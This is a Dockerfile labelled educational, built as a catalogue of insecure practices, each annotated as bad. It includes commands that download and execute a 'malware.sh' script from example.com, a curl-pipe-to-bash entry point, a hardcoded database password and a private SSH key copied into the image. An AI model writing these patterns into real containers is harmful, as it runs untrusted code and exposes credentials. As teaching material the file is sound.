# DO NOT USE IN PRODUCTION - FOR EDUCATIONAL PURPOSES ONLY

# Use a generic and outdated base image
FROM ubuntu:16.04

# Hardcoding sensitive information in the Dockerfile (BAD PRACTICE)
ENV DB_USERNAME="admin"
ENV DB_PASSWORD="SuperSecretPassword123"

# Running as root (BAD PRACTICE)
USER root

# Install software without verifying sources or checksums (BAD PRACTICE)
RUN apt-get update && apt-get install -y \
    wget \
    curl \
    nano \
    && wget http://example.com/malware.sh -O /tmp/malware.sh \
    && chmod +x /tmp/malware.sh \
    && /tmp/malware.sh

# Exposing unnecessary and insecure ports
EXPOSE 22 3306 8080

# Copy sensitive files into the image (BAD PRACTICE)
COPY ./id_rsa /root/.ssh/id_rsa
RUN chmod 600 /root/.ssh/id_rsa

# Leaving temporary files and secrets in the image (BAD PRACTICE)
RUN echo $DB_PASSWORD > /tmp/db_password.txt

# Using an untrusted script for the entry point
CMD ["/bin/bash", "-c", "curl http://example.com/run-app.sh | bash"]
